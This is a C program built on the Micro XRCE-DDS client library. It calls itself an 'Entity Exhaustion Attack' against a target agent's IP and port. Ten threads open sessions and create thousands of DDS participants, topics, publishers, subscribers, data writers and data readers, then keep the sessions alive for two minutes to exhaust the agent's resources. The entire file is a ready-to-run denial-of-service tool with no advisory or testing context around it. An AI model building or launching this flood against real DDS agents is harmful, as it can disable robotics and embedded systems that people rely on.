// Compile: gcc attack_entity_flood.c -o entity_flood -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#define STREAM_HISTORY  8
#define BUFFER_SIZE     UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY
#define MAX_ENTITIES    10000
#define NUM_THREADS     10

typedef struct {
    char* ip;
    char* port;
    int thread_id;
    int entities_per_thread;
} thread_args_t;

void* entity_flood_thread(void* arg) {
    thread_args_t* args = (thread_args_t*)arg;
    
    printf("[Thread %d] Starting entity flood...\n", args->thread_id);
    
    // Create transport
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, args->ip, args->port)) {
        printf("[Thread %d] Failed to init transport\n", args->thread_id);
        return NULL;
    }
    
    // Create unique session per thread
    uxrSession session;
    uint32_t session_key = 0xAA000000 + args->thread_id;
    uxr_init_session(&session, &transport.comm, session_key);
    
    if (!uxr_create_session(&session)) {
        printf("[Thread %d] Failed to create session\n", args->thread_id);
        uxr_close_udp_transport(&transport);
        return NULL;
    }
    
    // Create streams
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer, 
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, BUFFER_SIZE, STREAM_HISTORY);
    
    // Flood with entities
    int base_id = args->thread_id * args->entities_per_thread;
    
    for (int i = 0; i < args->entities_per_thread; i++) {
        int entity_num = base_id + i;
        
        // Create participant
        uxrObjectId participant_id = uxr_object_id(entity_num & 0xFF, UXR_PARTICIPANT_ID);
        char participant_xml[512];
        snprintf(participant_xml, sizeof(participant_xml),
                "<dds><participant><rtps><name>flood_participant_%d_%d</name></rtps></participant></dds>",
                args->thread_id, i);
        
        uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0,
                                         participant_xml, UXR_REPLACE);
        
        // Create topic
        uxrObjectId topic_id = uxr_object_id((entity_num + 1) & 0xFF, UXR_TOPIC_ID);
        char topic_xml[512];
        snprintf(topic_xml, sizeof(topic_xml),
                "<dds><topic><name>FloodTopic_%d_%d</name><dataType>string</dataType></topic></dds>",
                args->thread_id, i);
        
        uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id,
                                    topic_xml, UXR_REPLACE);
        
        // Create publisher
        uxrObjectId publisher_id = uxr_object_id((entity_num + 2) & 0xFF, UXR_PUBLISHER_ID);
        uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id,
                                       "", UXR_REPLACE);
        
        // Create subscriber
        uxrObjectId subscriber_id = uxr_object_id((entity_num + 3) & 0xFF, UXR_SUBSCRIBER_ID);
        uxr_buffer_create_subscriber_xml(&session, reliable_out, subscriber_id, participant_id,
                                        "", UXR_REPLACE);
        
        // Create datawriter
        uxrObjectId datawriter_id = uxr_object_id((entity_num + 4) & 0xFF, UXR_DATAWRITER_ID);
        uxrQoS_t qos = {
            .durability = UXR_DURABILITY_VOLATILE,
            .reliability = UXR_RELIABILITY_BEST_EFFORT,
            .history = UXR_HISTORY_KEEP_LAST,
            .depth = 1
        };
        uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, publisher_id,
                                        topic_id, "", qos, UXR_REPLACE);
        
        // Create datareader
        uxrObjectId datareader_id = uxr_object_id((entity_num + 5) & 0xFF, UXR_DATAREADER_ID);
        uxr_buffer_create_datareader_xml(&session, reliable_out, datareader_id, subscriber_id,
                                        topic_id, "", qos, UXR_REPLACE);
        
        if (i % 10 == 0) {
            printf("[Thread %d] Created %d entities...\n", args->thread_id, i * 6);
            uxr_run_session_time(&session, 100); // Brief sync
        }
    }
    
    // Keep session alive
    printf("[Thread %d] Keeping session alive...\n", args->thread_id);
    uxr_run_session_time(&session, 120000); // 2 minutes
    
    // Cleanup
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    printf("[Thread %d] Completed\n", args->thread_id);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Entity Exhaustion Attack ===\n");
    printf("Target: %s:%s\n", ip, port);
    printf("Total entities to create: %d\n", MAX_ENTITIES);
    printf("Number of threads: %d\n\n", NUM_THREADS);
    
    pthread_t threads[NUM_THREADS];
    thread_args_t thread_args[NUM_THREADS];
    int entities_per_thread = MAX_ENTITIES / NUM_THREADS;
    
    // Launch attack threads
    for (int i = 0; i < NUM_THREADS; i++) {
        thread_args[i].ip = ip;
        thread_args[i].port = port;
        thread_args[i].thread_id = i;
        thread_args[i].entities_per_thread = entities_per_thread;
        
        pthread_create(&threads[i], NULL, entity_flood_thread, &thread_args[i]);
    }
    
    // Wait for all threads
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[*] Attack completed\n");
    return 0;
}